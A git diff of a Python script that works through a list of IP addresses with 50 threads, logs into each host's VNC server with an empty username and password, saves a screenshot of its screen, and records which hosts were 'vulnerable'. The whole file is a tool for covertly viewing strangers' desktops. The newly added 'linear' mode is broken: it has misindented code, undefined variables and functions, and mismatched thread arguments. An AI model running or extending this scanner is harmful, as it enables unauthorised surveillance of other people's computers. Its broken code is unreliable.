@@ -3,6 +3,7 @@ import time
 from vncapi import api
 import os.path
 import threading
+import json
 from filelock import FileLock
 stopThreads = False
 
@@ -11,23 +12,32 @@ def attemptConnect(ips):
      for ip in ips:
         if not stopThreads:
             try:
-                with open('nonVulnerableIPs.txt') as f: #TODO: remove this O(n^2) check with something linear
+                with open('nonVulnerableIPs.txt') as f:
                     if ip not in f.read():
-                        client = api.connect('{ip}:0'.format(ip=ip),timeout=10, username='', password='')
-                        client.captureScreen('screenshot_IP_{ip}.png'.format(ip=ip))
-                        print('Got image from {ip}'.format(ip=ip))
-                        with FileLock("vulnerableIPs.txt.lock"): #TODO make non vulnernable ips a list of ALL ips checked, so we don't recsan 
+                        client = api.connect('{}:0'.format(ip),timeout=10, username='', password='')
+                        client.captureScreen('screenshot_IP_{}.png'.format(ip))
+                        print('Got image from {}'.format(ip))
+                        with FileLock("vulnerableIPs.txt.lock"): 
                                 with open('vulnerableIPs.txt', "a") as file: 
                                     file.write(ip + "\n")
                                     file.close() #TODO: is there even a point to close these?
                     f.close()
             except:
-                print('Cant get image from {ip}'.format(ip=ip))
-                #TODO add ability to edit "open" to "close" so as to not re-read the line
+                print('Cant get image from {}'.format(ip))
                 with FileLock("nonVulnerableIPs.txt.lock"):
-                        with open('nonVulnerableIPs.txt', "a") as file: #TODO make non vulnernable ips a list of ALL ips checked, so we don't recsan 
+                        with open('nonVulnerableIPs.txt', "a") as file:
                             file.write(ip + "\n")
                             file.close()
+
+def linearAttemptConnect(searchingFile):
+    #Similar to attemptConnect, however it removes the IP's already searched from their memory list 
+    #and then saves the leftover IP's when the script is cancelled to the searchingFile
+    #This script WILL REMOVE ips from the given file by overwriting them with the memory in the threads
+    #However, this will be very very fast!
+    global stopThreads
+     for ip in ips:
+        if not stopThreads:
+            pass
 
 def createThread(maxThreads, ips):
         currentIndex = 0
@@ -47,7 +57,7 @@ def createThread(maxThreads, ips):
 def parseIPs(textfile):
     if os.path.isfile(textfile):
         print('List of ips detected.')
-        with open('ips.txt') as f:
+        with open(textfile) as f:
             lines = f.readlines()
             ips = []
             for line in lines:
@@ -66,18 +76,30 @@ def main():
     
     maxThreads = 50
     threadRestartTime = 120 #set to super high for no restart
-    ip_file = 'ips.txt'
-    ips_to_multithread = createThread(maxThreads, parseIPs(ip_file))
+    ipFile = 'ips.txt'
+    searchingFile = 'ipsLeft.txt' #basically the amount of ips left to search
+    linear = True #set to false for non-linear searching with logging (very slow!)
+
+    ips_to_multithread = createThread(maxThreads, parseIPs(ipFile))
+
+    if(linear):
+        if not os.path.isfile(searchingFile):
+            createSearchingFile(ips)
 
     #Due to an issue in the underlying API, all threads must be restarted.
     #This will resolve issues involving Twisted timeout and such, as this API is not meant to be multithreaded
     #Every time Twisted has an error due to connectivity, it will crash the thread. Thus, we must recreate all threads
-    
+
     while True:
         stopThreads = False
         for i in range(0, maxThreads):
-            thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
-            thread.start()
+
+            if(linear):
+                thread = threading.Thread(target=linearAttemptConnect, kwargs={'threadNum':i, 'searchingFile':searchingFile})
+                thread.start()
+            else:
+                thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
+                thread.start()
         
         time.sleep(threadRestartTime)
         stopThreads = True
